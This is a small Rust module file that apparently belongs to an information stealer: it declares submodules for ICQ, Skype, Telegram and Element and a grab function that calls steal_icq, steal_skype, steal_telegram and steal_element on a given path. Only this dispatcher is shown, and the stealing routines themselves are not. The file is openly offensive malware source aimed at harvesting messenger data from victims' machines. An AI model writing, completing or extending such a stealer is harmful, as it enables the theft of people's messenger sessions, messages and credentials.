pub mod element;
pub mod icq;
pub mod skype;
pub mod telegram;


pub fn grab(path: String) {
    icq::steal_icq(path.clone());
    skype::steal_skype(path.clone());
    telegram::steal_telegram(path.clone());
    element::steal_element(path.clone());
}
